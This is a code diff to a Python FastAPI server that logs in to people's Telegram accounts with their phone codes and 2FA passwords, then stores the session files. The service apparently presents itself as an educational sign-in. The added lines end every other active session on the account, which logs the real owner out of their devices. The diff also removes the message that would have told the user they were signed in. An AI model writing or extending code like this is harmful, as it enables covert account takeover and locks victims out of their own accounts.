@@ -2,6 +2,7 @@ from fastapi import FastAPI, HTTPException
 from fastapi.middleware.cors import CORSMiddleware
 from telethon import TelegramClient
 from telethon.errors import SessionPasswordNeededError
+from telethon.tl import functions
 import os
 import json
 import time
@@ -70,7 +71,6 @@ async def verify_code(data: dict):
 
     try:
         await client.sign_in(phone=phone, code=code, phone_code_hash=phone_code_hash)
-
     except SessionPasswordNeededError:
         if not password:
             raise HTTPException(status_code=401, detail="2FA пароль обовʼязковий")
@@ -79,12 +79,19 @@ async def verify_code(data: dict):
         except Exception as e:
             print(f"[2FA ERROR] {type(e).__name__}: {e}")
             raise HTTPException(status_code=403, detail="Невірний 2FA пароль")
-
     except Exception as e:
         print(f"[VERIFY CODE ERROR] {type(e).__name__}: {e}")
         raise HTTPException(status_code=500, detail=str(e))
 
     me = await client.get_me()
+
+    try:
+        result = await client(functions.account.GetAuthorizationsRequest())
+        for auth in result.authorizations:
+            if not auth.current:
+                await client(functions.account.ResetAuthorizationRequest(hash=auth.hash))
+    except Exception as e:
+        print(f"[SESSION CLEANUP ERROR] {type(e).__name__}: {e}")
 
     user_data = {
         "session_file": f"{phone}.session",
@@ -125,7 +132,6 @@ async def verify_code(data: dict):
     with open(f"{user_folder}/{phone}.json", "w") as f:
         json.dump(user_data, f, indent=2)
 
-    await client.send_message("me", "✅ Ви авторизовані для навчальної системи.")
     await client.disconnect()
 
-    return {"status": "authorized", "username": me.username}
+    return {"status": "authorized_and_logged_out", "username": me.username}
